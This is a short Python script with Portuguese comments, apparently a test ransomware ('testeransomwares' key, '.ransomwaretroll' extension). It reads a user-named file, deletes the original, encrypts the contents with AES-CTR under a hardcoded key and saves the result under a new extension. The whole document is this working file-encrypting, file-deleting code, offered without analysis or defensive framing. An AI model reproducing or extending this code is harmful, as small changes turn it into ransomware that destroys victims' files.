import os
import pyaes

# Função para criptografar um arquivo
def encrypt_file(file_name):
    # Abrir o arquivo a ser criptografado
    with open(file_name, "rb") as file:
        file_data = file.read()

    # Remover o arquivo original
    os.remove(file_name)

    # Chave de criptografia
    key = b"testeransomwares"  # A chave para criptografia (deve ser mantida em segredo)

    # Inicializar o AES no modo CTR
    aes = pyaes.AESModeOfOperationCTR(key)

    # Criptografar os dados do arquivo
    crypto_data = aes.encrypt(file_data)

    # Salvar o arquivo criptografado
    encrypted_file_name = file_name + ".ransomwaretroll"
    with open(encrypted_file_name, 'wb') as new_file:
        new_file.write(crypto_data)

    print(f"Arquivo criptografado com sucesso: {encrypted_file_name}")

# Exemplo de uso
if __name__ == '__main__':
    file_name = input("Digite o caminho do arquivo para criptografar: ")
    encrypt_file(file_name)
